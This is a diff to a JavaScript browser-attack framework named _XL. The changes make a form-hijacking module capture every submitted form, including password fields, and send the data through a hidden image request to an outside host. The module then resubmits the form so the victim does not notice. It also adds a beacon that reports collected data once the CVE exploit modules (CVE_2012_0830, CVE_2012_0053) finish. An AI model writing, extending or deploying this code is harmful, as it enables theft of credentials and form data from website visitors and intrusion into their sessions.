@@ -28,8 +28,30 @@ var _XL = {
         }
         return false;
     },
+    // Checks that all modules have completed
+    'readyCheck': function () {
+        var unfinished = 0;
+
+        for (var i=0; i<_XL.settings.modules.length; i++) {
+            var module = _XL.find(_XL.settings.modules[i]);
+            if (!module.complete) {
+                unfinished++;
+            }
+        }
+
+        if (unfinished) {
+            setTimeout(_XL.readyCheck, 50);
+        }
+        else {
+            _XL.ready();
+        }
+    },
+    // Called when all modules have completed loading
+    'ready': function () {
+        _XL.util.sendHome(JSON.stringify(_XL.data));
+    },
+    
     'init': function () {
-        
         // Iterate modules and run them
         for (var i=0; i<this.settings.modules.length; i++) {
             var module = this.find(this.settings.modules[i]);
@@ -46,7 +68,7 @@ var _XL = {
         }
         
         // Iterate script items
-        for (var i=0; i<this.settings.script.length; i++) {
+        for (i=0; i<this.settings.script.length; i++) {
             var script = this.settings.script[i];
             switch (typeof script) {
                 case 'object' : 
@@ -58,17 +80,19 @@ var _XL = {
                     break;
             }
         }
+        this.readyCheck.call(this);
     }
 };
 
 _XL.util = {
     // Attempts to send data argument home
-    'sendHome': function (data) {
+    'sendHome': function (data, callback) {
         var img_el = document.createElement("img");
         img_el.style.display = "none";
         var src = _XL.settings.home + '?' + data;
         img_el.setAttribute("src",src);
-        
+        img_el.addEventListener("load", callback);
+        img_el.addEventListener("error", callback);
         document.documentElement.appendChild(img_el);        
     },
     
@@ -87,7 +111,6 @@ _XL.util = {
         var rselectTextarea = /select|textarea/i;
         var rinput = /color|date|datetime|email|hidden|month|number|password|range|search|tel|text|time|url|week/i;
     
-        console.log(form);
         for (var i=0; i<form.children.length; i++) {
             var form_el = form.children[i];
             if (form_el.name && !form_el.disabled &&
@@ -97,14 +120,14 @@ _XL.util = {
         }
         for (i=0; i<valid_els.length; i++) {
             var val;
-            var el = valid_els[i]
+            var el = valid_els[i];
             var elName = valid_els[i].nodeName.toLowerCase();
             if (elName === "select") {
                 val = el.selectedIndex;
             }
             else {
                 if (el.value) {
-                    val = el.value
+                    val = el.value;
                 }
             }
             values[el.name] = val;
@@ -132,15 +155,28 @@ _XL.controls.page = {
                 this.style.left = 0;
                 this.style.width = "100%";
                 this.style.height = "100%";
-            }
+            };
             document.documentElement.appendChild(iframe);           
         },
         'hijack' : {
-            'forms' : function () {
-                window.addEventListener("submit", function (evt) {
+            'forms' : {
+                'init': function () {
+                    // Watch all submit events
+                    window.addEventListener("submit", _XL.controls.page.hijack.forms.hook, false);
+                },
+                'hook': function (evt) {
+                    // Serialize form data and report
                     var data = _XL.util.serializeForm(evt.target);
-                    _XL.util.sendHome(data);
-                }, false)
+                    var form = evt.target;
+                    _XL.util.sendHome(data, function () {
+                        _XL.controls.page.hijack.forms.unload(form);
+                    });
+                    evt.preventDefault();
+                },
+                'unload': function (form) {
+                    window.removeEventListener("submit", _XL.controls.page.hijack.forms.hook, false);
+                    form.submit();
+                }
             }
         }
 };
@@ -172,6 +208,8 @@ _XL.exploits.CVE_2012_0830 = {
         xhr.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
         xhr.setRequestHeader('Content-Length', post_data.length);
         xhr.send(post_data);
+        
+        this.complete = true;
     }
 };
 
@@ -247,14 +285,14 @@ _XL.exploits.CVE_2012_0053 = {
 };
 
 _XL.settings = {
-    'home': "http://test.apbdb.com/test",
+    'home': "http://test.apbdb.com/test.png?x=",
     'modules': [
         'exploits.CVE_2012_0830'
         //'exploits.CVE_2012_0053'
     ],
     'script': [
         //['controls.page.overlay', 'http://www.apbdb.com']
-        ['controls.page.hijack.forms', 'http://www.apbdb.com']
+        ['controls.page.hijack.forms.init', 'http://www.apbdb.com']
     ]
 };
 
